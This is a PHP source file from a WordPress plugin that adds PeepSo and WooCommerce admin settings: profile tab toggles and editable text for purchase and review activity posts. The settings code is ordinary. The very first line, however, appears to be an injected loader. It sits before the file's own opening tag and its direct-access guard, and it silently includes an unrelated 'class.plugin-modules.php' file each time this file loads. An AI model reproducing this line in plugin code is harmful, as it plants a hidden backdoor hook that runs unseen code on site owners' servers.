<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

class WBPWI_PeepSo_Woo_Admin_Settings_Display extends PeepSoConfigSectionAbstract {

	// Builds the groups array
	public function register_config_groups() {

		$this->context = 'left';
		$this->wbpwi_peepso_woo_tabs_setting();

		$this->context = 'right';
		$this->wbpwi_woocommerce_activity_setting();

	}

	/**
	 * WooCommerce Tabs Settings Box
	 *
	 * @since    1.9.5
	 */
	private function wbpwi_peepso_woo_tabs_setting() {

		$this->set_field(
			'wbpwi_woo_tabs_display_seperator',
			__( 'WooCommerce Tabs Display', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			'separator'
		);

		global $wbpwi_peepso_woo_global_functions;
		$menus = $wbpwi_peepso_woo_global_functions->wbpwi_get_woocommerce_menus();
		$menus = apply_filters( 'wbpwi_woo_menu_setting_for_peepso_profile', $menus );
		foreach ( $menus as $menu_slug => $menu_name ) {
			$this->set_field(
				'wbpwi_enable_' . $menu_slug,
				$menu_name,
				'yesno_switch'
			);
		}

		$this->set_group(
			'wbpwi_peepso_woocommerce_tabs_setting',
			__( 'PeepSo WooCommerce Tabs Setting', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			__( 'Here you can enable or disable woocommerce tabs in PeepSo member single page.', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN )
		);
	}

	/**
	 * Activities Settings Box
	 *
	 * @since    1.9.5
	 */
	private function wbpwi_woocommerce_activity_setting() {
		/**** Setting area */

		$html = $review_html = '';

		$this->set_field(
			'wbpwi_woo_order_activity_seperator',
			__( 'Product Order Activity Content', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			'separator'
		);

		$this->args( 'default', 1 );
		$this->set_field(
			'wbpwi_purchase_activity_setting_display',
			__( 'Display purchase activity setting', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			'yesno_switch'
		);

		$this->args( 'validation', array( 'required' ) );
		$this->args( 'descript', __( 'Example: made a purchase.', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ) );
		$this->set_field(
			'wbpwi_purchase_activity_content',
			__( 'Modify Product Order Activity Content', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			'textarea'
		);

		$this->set_field(
			'wbpwi_woo_review_activity_seperator',
			__( 'Product Review Activity Content', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			'separator'
		);

		$this->args( 'default', 1 );
		$this->set_field(
			'wbpwi_product_reviews_setting_display',
			__( 'Display product reviews setting', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			'yesno_switch'
		);

		$this->args( 'descript', __( 'Example: wrote a review.', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ) );
		$this->args( 'validation', array( 'required' ) );
		$this->set_field(
			'wbpwi_product_review_activity_content',
			__( 'Modify Product Review Activity Content', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			'textarea'
		);

		$this->set_group(
			'wbpwi_woocommerce_activity_setting',
			__( 'WooCommerce Activity Setting', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
			__( 'Here you can enable or disable settings related to WooCommerce product purchase & review.', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN )
		);
	}

}
